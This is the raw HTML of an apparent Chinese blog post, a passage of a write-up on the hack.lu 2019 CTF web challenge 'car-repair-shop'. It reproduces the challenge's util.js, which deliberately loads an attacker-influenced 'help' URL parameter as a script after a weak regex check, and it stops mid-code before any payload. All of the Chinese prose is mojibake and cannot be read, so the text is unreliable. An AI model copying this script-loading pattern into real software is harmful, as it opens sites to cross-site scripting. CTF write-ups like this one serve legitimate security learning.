<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="å‰è¨€è¿™ä¸¤å¤©æ‰“äº†hack.lu ctfæ„Ÿè§‰é¢˜ç›®éƒ½è¿˜ä¸é”™ï¼Œå› æ­¤æ€»ç»“ä¸€æ³¢ã€‚ car-repair-shopé¢˜ç›®æ¶‰åŠåˆ°çš„çŸ¥è¯†ã€‚åŸå‹é“¾çš„æ±¡æŸ“ï¼Œurlæ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡ï¼ŒDOM-XSSé¢˜ç›®æè¿°ï¼š1&amp;quot;Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.&amp;quot;  é¢˜ç›®åœ°å€å¦‚ä¸‹Enter the s">
<meta property="og:type" content="article">
<meta property="og:title" content="hack.lu 2019çš„éƒ¨åˆ†webé¢˜è§£">
<meta property="og:url" content="http://yoursite.com/2019/12/19/hack-lu-2019çš„éƒ¨åˆ†webé¢˜è§£/index.html">
<meta property="og:site_name" content="L&#39;s Blog">
<meta property="og:description" content="å‰è¨€è¿™ä¸¤å¤©æ‰“äº†hack.lu ctfæ„Ÿè§‰é¢˜ç›®éƒ½è¿˜ä¸é”™ï¼Œå› æ­¤æ€»ç»“ä¸€æ³¢ã€‚ car-repair-shopé¢˜ç›®æ¶‰åŠåˆ°çš„çŸ¥è¯†ã€‚åŸå‹é“¾çš„æ±¡æŸ“ï¼Œurlæ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡ï¼ŒDOM-XSSé¢˜ç›®æè¿°ï¼š1&amp;quot;Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.&amp;quot;  é¢˜ç›®åœ°å€å¦‚ä¸‹Enter the s">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/car-repair-shop.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/flag-requestbin.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/website.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/csp.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/site.png">
<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/internal.png">
<meta property="og:updated_time" content="2019-12-19T12:51:11.842Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="hack.lu 2019çš„éƒ¨åˆ†webé¢˜è§£">
<meta name="twitter:description" content="å‰è¨€è¿™ä¸¤å¤©æ‰“äº†hack.lu ctfæ„Ÿè§‰é¢˜ç›®éƒ½è¿˜ä¸é”™ï¼Œå› æ­¤æ€»ç»“ä¸€æ³¢ã€‚ car-repair-shopé¢˜ç›®æ¶‰åŠåˆ°çš„çŸ¥è¯†ã€‚åŸå‹é“¾çš„æ±¡æŸ“ï¼Œurlæ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡ï¼ŒDOM-XSSé¢˜ç›®æè¿°ï¼š1&amp;quot;Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.&amp;quot;  é¢˜ç›®åœ°å€å¦‚ä¸‹Enter the s">
<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/car-repair-shop.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'åšä¸»'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/12/19/hack-lu-2019çš„éƒ¨åˆ†webé¢˜è§£/">





  <title>hack.lu 2019çš„éƒ¨åˆ†webé¢˜è§£ | L's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">L's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">share with you</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            é¦–é¡µ
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            å…³äº
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            æ ‡ç­¾
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            åˆ†ç±»
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            å½’æ¡£
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/19/hack-lu-2019çš„éƒ¨åˆ†webé¢˜è§£/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ljdd520">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">hack.lu 2019çš„éƒ¨åˆ†webé¢˜è§£</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-12-19T20:36:47+08:00">
                2019-12-19
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  6.5k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  29
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>è¿™ä¸¤å¤©æ‰“äº†hack.lu ctfæ„Ÿè§‰é¢˜ç›®éƒ½è¿˜ä¸é”™ï¼Œå› æ­¤æ€»ç»“ä¸€æ³¢ã€‚</p>
<h4 id="car-repair-shop"><a href="#car-repair-shop" class="headerlink" title="car-repair-shop"></a>car-repair-shop</h4><h4 id="é¢˜ç›®æ¶‰åŠåˆ°çš„çŸ¥è¯†ã€‚"><a href="#é¢˜ç›®æ¶‰åŠåˆ°çš„çŸ¥è¯†ã€‚" class="headerlink" title="é¢˜ç›®æ¶‰åŠåˆ°çš„çŸ¥è¯†ã€‚"></a>é¢˜ç›®æ¶‰åŠåˆ°çš„çŸ¥è¯†ã€‚</h4><h5 id="åŸå‹é“¾çš„æ±¡æŸ“ï¼Œurlæ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡ï¼ŒDOM-XSS"><a href="#åŸå‹é“¾çš„æ±¡æŸ“ï¼Œurlæ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡ï¼ŒDOM-XSS" class="headerlink" title="åŸå‹é“¾çš„æ±¡æŸ“ï¼Œurlæ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡ï¼ŒDOM-XSS"></a>åŸå‹é“¾çš„æ±¡æŸ“ï¼Œurlæ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡ï¼ŒDOM-XSS</h5><h4 id="é¢˜ç›®æè¿°ï¼š"><a href="#é¢˜ç›®æè¿°ï¼š" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.&quot;</span><br></pre></td></tr></table></figure>

<h5 id="é¢˜ç›®åœ°å€å¦‚ä¸‹Enter-the-shop"><a href="#é¢˜ç›®åœ°å€å¦‚ä¸‹Enter-the-shop" class="headerlink" title="é¢˜ç›®åœ°å€å¦‚ä¸‹Enter the shop"></a>é¢˜ç›®åœ°å€å¦‚ä¸‹<a href="https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/" target="_blank" rel="noopener">Enter the shop</a></h5><h4 id="é¢˜ç›®åˆ†æï¼š"><a href="#é¢˜ç›®åˆ†æï¼š" class="headerlink" title="é¢˜ç›®åˆ†æï¼š"></a>é¢˜ç›®åˆ†æï¼š</h4><h5 id="è®¿é—®é¢˜ç›®ç»™çš„é“¾æ¥åå°†å‘ˆç°ä¸‹é¢çš„ç•Œé¢ï¼š"><a href="#è®¿é—®é¢˜ç›®ç»™çš„é“¾æ¥åå°†å‘ˆç°ä¸‹é¢çš„ç•Œé¢ï¼š" class="headerlink" title="è®¿é—®é¢˜ç›®ç»™çš„é“¾æ¥åå°†å‘ˆç°ä¸‹é¢çš„ç•Œé¢ï¼š"></a>è®¿é—®é¢˜ç›®ç»™çš„é“¾æ¥åå°†å‘ˆç°ä¸‹é¢çš„ç•Œé¢ï¼š</h5><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/car-repair-shop.png" alt></p>
<h6 id="åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡ ä¸ªæŒ‰é’®ï¼Œå•å‡»è¿™äº›æŒ‰é’®å°†æ‰§è¡ŒæŸäº›åŠŸèƒ½ã€‚"><a href="#åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡ ä¸ªæŒ‰é’®ï¼Œå•å‡»è¿™äº›æŒ‰é’®å°†æ‰§è¡ŒæŸäº›åŠŸèƒ½ã€‚" class="headerlink" title="åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡ ä¸ªæŒ‰é’®ï¼Œå•å‡»è¿™äº›æŒ‰é’®å°†æ‰§è¡ŒæŸäº›åŠŸèƒ½ã€‚"></a>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡ ä¸ªæŒ‰é’®ï¼Œå•å‡»è¿™äº›æŒ‰é’®å°†æ‰§è¡ŒæŸäº›åŠŸèƒ½ã€‚</h6><h6 id="ä¸‹é¢æ˜¯ä¸€ä¸ªæ¶ˆæ¯æ¡†ï¼Œè¯¥æ¶ˆæ¯æ¡†åœ¨æ‰§è¡ŒæŸäº›åŠŸèƒ½åä¼šæ›´æ–°å†…å®¹ã€‚"><a href="#ä¸‹é¢æ˜¯ä¸€ä¸ªæ¶ˆæ¯æ¡†ï¼Œè¯¥æ¶ˆæ¯æ¡†åœ¨æ‰§è¡ŒæŸäº›åŠŸèƒ½åä¼šæ›´æ–°å†…å®¹ã€‚" class="headerlink" title="ä¸‹é¢æ˜¯ä¸€ä¸ªæ¶ˆæ¯æ¡†ï¼Œè¯¥æ¶ˆæ¯æ¡†åœ¨æ‰§è¡ŒæŸäº›åŠŸèƒ½åä¼šæ›´æ–°å†…å®¹ã€‚"></a>ä¸‹é¢æ˜¯ä¸€ä¸ªæ¶ˆæ¯æ¡†ï¼Œè¯¥æ¶ˆæ¯æ¡†åœ¨æ‰§è¡ŒæŸäº›åŠŸèƒ½åä¼šæ›´æ–°å†…å®¹ã€‚</h6><h6 id="åœ¨åº•éƒ¨ï¼Œè¿˜æœ‰ä¸€ä¸ªåä¸ºget-your-cookieçš„æŒ‰é’®ï¼Œè¯¥æŒ‰é’®å°†å¯¼è‡´ä¸€ä¸ªå¯ä»¥å¼•ç”¨URLçš„å­é¡µé¢"><a href="#åœ¨åº•éƒ¨ï¼Œè¿˜æœ‰ä¸€ä¸ªåä¸ºget-your-cookieçš„æŒ‰é’®ï¼Œè¯¥æŒ‰é’®å°†å¯¼è‡´ä¸€ä¸ªå¯ä»¥å¼•ç”¨URLçš„å­é¡µé¢" class="headerlink" title="åœ¨åº•éƒ¨ï¼Œè¿˜æœ‰ä¸€ä¸ªåä¸ºget your cookieçš„æŒ‰é’®ï¼Œè¯¥æŒ‰é’®å°†å¯¼è‡´ä¸€ä¸ªå¯ä»¥å¼•ç”¨URLçš„å­é¡µé¢"></a>åœ¨åº•éƒ¨ï¼Œè¿˜æœ‰ä¸€ä¸ªåä¸º<code>get your cookie</code>çš„æŒ‰é’®ï¼Œè¯¥æŒ‰é’®å°†å¯¼è‡´ä¸€ä¸ªå¯ä»¥å¼•ç”¨URLçš„å­é¡µé¢</h6><h6 id="æäº¤urlåæµè§ˆå™¨å°†ä¼šè‡ªåŠ¨è®¿é—®ã€‚"><a href="#æäº¤urlåæµè§ˆå™¨å°†ä¼šè‡ªåŠ¨è®¿é—®ã€‚" class="headerlink" title="æäº¤urlåæµè§ˆå™¨å°†ä¼šè‡ªåŠ¨è®¿é—®ã€‚"></a>æäº¤urlåæµè§ˆå™¨å°†ä¼šè‡ªåŠ¨è®¿é—®ã€‚</h6><h6 id="è¿™ä¸ªå¤§å›¾çœ‹èµ·æ¥æˆ‘ä»¬éœ€è¦å»æ„é€ ä¸€ä¸ªurlåŒ…å«æˆ‘ä»¬çš„payloadå»æäº¤å®ƒã€‚"><a href="#è¿™ä¸ªå¤§å›¾çœ‹èµ·æ¥æˆ‘ä»¬éœ€è¦å»æ„é€ ä¸€ä¸ªurlåŒ…å«æˆ‘ä»¬çš„payloadå»æäº¤å®ƒã€‚" class="headerlink" title="è¿™ä¸ªå¤§å›¾çœ‹èµ·æ¥æˆ‘ä»¬éœ€è¦å»æ„é€ ä¸€ä¸ªurlåŒ…å«æˆ‘ä»¬çš„payloadå»æäº¤å®ƒã€‚"></a>è¿™ä¸ªå¤§å›¾çœ‹èµ·æ¥æˆ‘ä»¬éœ€è¦å»æ„é€ ä¸€ä¸ªurlåŒ…å«æˆ‘ä»¬çš„payloadå»æäº¤å®ƒã€‚</h6><h6 id="å½“ä»–è¢«è®¿é—®æ—¶ï¼Œæˆ‘ä»¬å¿…é¡»ä»¥æŸç§æ–¹å¼å‚å…¥è¿™ä¸ªflagã€‚"><a href="#å½“ä»–è¢«è®¿é—®æ—¶ï¼Œæˆ‘ä»¬å¿…é¡»ä»¥æŸç§æ–¹å¼å‚å…¥è¿™ä¸ªflagã€‚" class="headerlink" title="å½“ä»–è¢«è®¿é—®æ—¶ï¼Œæˆ‘ä»¬å¿…é¡»ä»¥æŸç§æ–¹å¼å‚å…¥è¿™ä¸ªflagã€‚"></a>å½“ä»–è¢«è®¿é—®æ—¶ï¼Œæˆ‘ä»¬å¿…é¡»ä»¥æŸç§æ–¹å¼å‚å…¥è¿™ä¸ªflagã€‚</h6><h6 id="è¿™ä¸ªæŒ‰é’®çš„åå­—ä¸ªæ•°æˆ‘ä»¬è¿™ä¸ªflagåœ¨cookieé‡Œé¢ã€‚"><a href="#è¿™ä¸ªæŒ‰é’®çš„åå­—ä¸ªæ•°æˆ‘ä»¬è¿™ä¸ªflagåœ¨cookieé‡Œé¢ã€‚" class="headerlink" title="è¿™ä¸ªæŒ‰é’®çš„åå­—ä¸ªæ•°æˆ‘ä»¬è¿™ä¸ªflagåœ¨cookieé‡Œé¢ã€‚"></a>è¿™ä¸ªæŒ‰é’®çš„åå­—ä¸ªæ•°æˆ‘ä»¬è¿™ä¸ªflagåœ¨cookieé‡Œé¢ã€‚</h6><h5 id="è¯¥é¡µé¢å¾ˆå°å¹¶ä¸”åŒ…å«äº†å…¶ä»–å‡ ä¸ªæœ‰è¶£çš„æ–‡ä»¶ï¼š"><a href="#è¯¥é¡µé¢å¾ˆå°å¹¶ä¸”åŒ…å«äº†å…¶ä»–å‡ ä¸ªæœ‰è¶£çš„æ–‡ä»¶ï¼š" class="headerlink" title="è¯¥é¡µé¢å¾ˆå°å¹¶ä¸”åŒ…å«äº†å…¶ä»–å‡ ä¸ªæœ‰è¶£çš„æ–‡ä»¶ï¼š"></a>è¯¥é¡µé¢å¾ˆå°å¹¶ä¸”åŒ…å«äº†å…¶ä»–å‡ ä¸ªæœ‰è¶£çš„æ–‡ä»¶ï¼š</h5><ul>
<li>index.html</li>
<li>car.class.js</li>
<li>util.js</li>
<li>jquery.min.js</li>
<li>jquery.md5.js</li>
</ul>
<h5 id="util-jsè´Ÿè´£å»ºç«‹ç±»ä¼¼äºäº‹ä»¶å¤„ç†ç¨‹åºçš„é¡µé¢ï¼Œç„¶åå¼€å§‹æ‰§è¡Œä¸€äº›ä»£ç ã€‚"><a href="#util-jsè´Ÿè´£å»ºç«‹ç±»ä¼¼äºäº‹ä»¶å¤„ç†ç¨‹åºçš„é¡µé¢ï¼Œç„¶åå¼€å§‹æ‰§è¡Œä¸€äº›ä»£ç ã€‚" class="headerlink" title="util.jsè´Ÿè´£å»ºç«‹ç±»ä¼¼äºäº‹ä»¶å¤„ç†ç¨‹åºçš„é¡µé¢ï¼Œç„¶åå¼€å§‹æ‰§è¡Œä¸€äº›ä»£ç ã€‚"></a><code>util.js</code>è´Ÿè´£å»ºç«‹ç±»ä¼¼äºäº‹ä»¶å¤„ç†ç¨‹åºçš„é¡µé¢ï¼Œç„¶åå¼€å§‹æ‰§è¡Œä¸€äº›ä»£ç ã€‚</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> urlParams = <span class="keyword">new</span> URLSearchParams(<span class="built_in">window</span>.location.search);</span><br><span class="line"><span class="keyword">const</span> h = location.hash.slice(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> bugatti = <span class="keyword">new</span> Car(<span class="string">'Bugatti'</span>, <span class="string">'T35'</span>, <span class="string">'green'</span>, <span class="string">'assets/images/bugatti.png'</span>)</span><br><span class="line"><span class="keyword">const</span> porsche = <span class="keyword">new</span> Car(<span class="string">'Porsche'</span>, <span class="string">'911'</span>, <span class="string">'yellow'</span>, <span class="string">'assets/images/porsche.png'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cars = [bugatti, porsche]</span><br><span class="line"></span><br><span class="line">porsche.repair = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!bugatti.isStarted())&#123;</span><br><span class="line">        infobox(<span class="string">`Not so fast. Repair the other car first!`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($.md5(porsche) == <span class="string">'9cdfb439c7876e703e307864c9167a15'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(urlParams.has(<span class="string">'help'</span>)) &#123;</span><br><span class="line">            repairWithHelper(urlParams.get(<span class="string">'help'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        infobox(<span class="string">`Repairing this is not that easy.`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">porsche.ignition = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    infobox(<span class="string">`Hmm ... WTF!`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> [car] = cars</span><br><span class="line">    $(<span class="string">'.fa-power-off'</span>).click(<span class="function"><span class="params">()</span> =&gt;</span> car.powerOn())</span><br><span class="line">    $(<span class="string">'.fa-car'</span>).click(<span class="function"><span class="params">()</span> =&gt;</span> car.info())</span><br><span class="line">    $(<span class="string">'.fa-lightbulb-o'</span>).click(<span class="function"><span class="params">()</span> =&gt;</span> car.light())</span><br><span class="line">    $(<span class="string">'.fa-battery-quarter'</span>).click(<span class="function"><span class="params">()</span> =&gt;</span> car.battery())</span><br><span class="line">    $(<span class="string">'.fa-key'</span>).click(<span class="function"><span class="params">()</span> =&gt;</span> car.ignition())</span><br><span class="line">    $(<span class="string">'.fa-wrench'</span>).click(<span class="function"><span class="params">()</span> =&gt;</span> car.repair())</span><br><span class="line"></span><br><span class="line">    $(<span class="string">'.fa-step-forward'</span>).click(<span class="function"><span class="params">()</span> =&gt;</span> nextCar())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(h.includes(<span class="string">'Bugatti'</span>))</span><br><span class="line">        autoStart(bugatti)</span><br><span class="line">    <span class="keyword">if</span>(h.includes(<span class="string">'Porsche'</span>))</span><br><span class="line">        autoStart(porsche)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> nextCar = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    cars.push(cars.shift())</span><br><span class="line">    $(<span class="string">".image"</span>).attr(<span class="string">'src'</span>, cars[<span class="number">0</span>].pic);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> autoStart = <span class="function">(<span class="params">car</span>) =&gt;</span> &#123;</span><br><span class="line">    car.repair()</span><br><span class="line">    car.ignition()</span><br><span class="line">    car.powerOn()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> repairWithHelper = <span class="function">(<span class="params">src</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">/* who needs csp anyways !? */</span></span><br><span class="line">    urlRegx = <span class="regexp">/^\w&#123;4,5&#125;:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/</span>;</span><br><span class="line">    <span class="keyword">if</span> (urlRegx.test(src)) &#123;</span><br><span class="line">        <span class="keyword">let</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>)</span><br><span class="line">        s.src = src</span><br><span class="line">        $(<span class="string">'head'</span>).append(s)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> infobox = <span class="function">(<span class="params">text</span>) =&gt;</span> &#123;</span><br><span class="line">    $(<span class="string">'a'</span>).css(&#123;<span class="string">'pointer-events'</span>: <span class="string">'none'</span>, <span class="string">'border'</span>: <span class="string">'none'</span>&#125;)</span><br><span class="line">    $(<span class="string">'.infobox'</span>).addClass(<span class="string">'infoAnimate'</span>)</span><br><span class="line">        .text(text)</span><br><span class="line">        .on(<span class="string">'animationend'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            $(<span class="keyword">this</span>).removeClass(<span class="string">'infoAnimate'</span>)</span><br><span class="line">            $(<span class="string">'a'</span>).css(&#123;<span class="string">'pointer-events'</span>: <span class="string">'all'</span>, <span class="string">'border'</span>: <span class="string">'solid 1px rgba(255, 255, 255, .25)'</span>&#125;)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="è¿™autoStartå‡½æ•°å°†ä¼šæ‰§è¡Œrepairï¼Œignitionå’ŒpowerOnæ±½è½¦çš„æ–¹æ³•ä½œä¸ºå‚æ•°ä¼ é€’ã€‚"><a href="#è¿™autoStartå‡½æ•°å°†ä¼šæ‰§è¡Œrepairï¼Œignitionå’ŒpowerOnæ±½è½¦çš„æ–¹æ³•ä½œä¸ºå‚æ•°ä¼ é€’ã€‚" class="headerlink" title="è¿™autoStartå‡½æ•°å°†ä¼šæ‰§è¡Œrepairï¼Œignitionå’ŒpowerOnæ±½è½¦çš„æ–¹æ³•ä½œä¸ºå‚æ•°ä¼ é€’ã€‚"></a>è¿™<code>autoStart</code>å‡½æ•°å°†ä¼šæ‰§è¡Œ<code>repair</code>ï¼Œignitionå’ŒpowerOnæ±½è½¦çš„æ–¹æ³•ä½œä¸ºå‚æ•°ä¼ é€’ã€‚</h6><h6 id="è¿™repairå‡½æ•°è®¿é—®è¯¥URLå¹¶è§£æä¸ç›¸åŒåç§°çš„åŠŸèƒ½çš„æŸ¥è¯¢å‚æ•°çš„JSONå¯¹è±¡ï¼š"><a href="#è¿™repairå‡½æ•°è®¿é—®è¯¥URLå¹¶è§£æä¸ç›¸åŒåç§°çš„åŠŸèƒ½çš„æŸ¥è¯¢å‚æ•°çš„JSONå¯¹è±¡ï¼š" class="headerlink" title="è¿™repairå‡½æ•°è®¿é—®è¯¥URLå¹¶è§£æä¸ç›¸åŒåç§°çš„åŠŸèƒ½çš„æŸ¥è¯¢å‚æ•°çš„JSONå¯¹è±¡ï¼š"></a>è¿™<code>repair</code>å‡½æ•°è®¿é—®è¯¥URLå¹¶è§£æä¸ç›¸åŒåç§°çš„åŠŸèƒ½çš„æŸ¥è¯¢å‚æ•°çš„JSONå¯¹è±¡ï¼š</h6><figure class="highlight javascript"><table><tr><td 